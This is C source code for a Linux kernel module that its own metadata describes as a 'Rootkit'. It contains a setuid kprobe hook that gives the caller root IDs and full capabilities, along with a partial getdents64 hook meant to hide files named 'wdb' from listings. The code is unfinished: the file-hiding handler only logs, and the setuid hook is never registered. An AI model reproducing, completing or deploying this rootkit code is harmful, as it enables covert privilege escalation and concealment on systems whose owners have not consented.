#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/capability.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/atomic.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>
#include <linux/fs.h>

#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");


#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0

static int __kprobes __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs);
static int __kprobes __x64_sys_getdents64_handler(struct kretprobe_instance *ri, struct pt_regs *regs);

struct getdents_callback64{
	struct dir_context ctx;
	struct linux_dirent64 __user * current_dir;
	int prev_reclen;
	int count;
	int error;
};



void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}
/* Hiding our files from ls */
const char *hidden_filenames[1]={"wdb"};
/* struct for info to be passed from entry handler to post handler */
struct getdents_data{
    int fd;
    struct linux_dirent64 *dirent_buf;
    int count;
    int skip_file;
};

static struct kretprobe kp={
    .entry_handler		=__x64_sys_getdents64_entry_handler,
    .handler			=__x64_sys_getdents64_handler,
    .kp.symbol_name		="__x64_sys_getdents64",
    .maxactive			=20,
};


static int __kprobes __x64_sys_getdents64_entry_handler(struct kretprobe_instance *kp, struct pt_regs *regs){
	printk(KERN_INFO "initiating __x64_sys_getdents64_entry_handler...");

	
	return 0;
}

static int __kprobes __x64_sys_getdents64_handler(struct kretprobe_instance *kp, struct pt_regs *regs){
	printk(KERN_INFO "initiating __x64_sys_getdents64_handler...");

	printk(KERN_INFO "handler return: %lx:", regs->ax);

	unsigned long ret = regs_return_value(regs);
	struct linux_dirent64 __user *dirent= (struct linux_dirent64*) regs->si;

	struct linux_dirent64 *kbuf=NULL;
	kbuf=kzalloc(ret,GFP_KERNEL);
	if(kbuf==NULL){
		printk(KERN_ERR "could not allocate mem");
	}



	long error = copy_from_user(kbuf,dirent,ret);
	if(error){
		printk(KERN_ERR "could not copy_from_user, %lu bytes left", ret);
	}
	

	printk(KERN_INFO "attempting to access regs->si d_name: %s", kbuf->d_name);
	return 0;
}

struct kprobe __x64_sys_setuid_hook = {
        .symbol_name = "__x64_sys_setuid",
        .post_handler = __x64_sys_setuid_post_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");

    int ret=register_kretprobe(&kp);
    if(ret<0){
        printk(KERN_ERR"could not register handler");
	return ret;
    }
    return 0;
}

static void __exit rkout(void)
{
    unregister_kretprobe(&kp);
}

module_init(rkin);
module_exit(rkout);

